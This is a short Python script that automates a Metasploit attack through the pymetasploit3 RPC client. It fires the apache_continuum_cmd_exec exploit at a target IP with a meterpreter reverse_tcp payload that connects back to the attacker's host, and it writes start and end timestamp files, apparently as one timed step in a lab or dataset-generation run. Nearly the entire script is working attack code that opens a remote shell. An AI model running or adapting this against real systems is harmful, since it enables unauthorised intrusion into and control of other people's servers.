import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]
    
    output_time_file_start = 'time_step_3_start.txt'
    record_timestamp(folder, output_time_file_start)
    time.sleep(60)

    client = MsfRpcClient('kali')

    exploit = client.modules.use('exploit', 'linux/http/apache_continuum_cmd_exec')
    payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
    exploit['RHOSTS'] = target_ip
    payload['LHOST'] = my_ip

    exploit.execute(payload=payload)

    time.sleep(60)
    output_time_file_end = 'time_step_3_end.txt'
    record_timestamp(folder, output_time_file_end)
    time.sleep(30)


main(sys.argv)
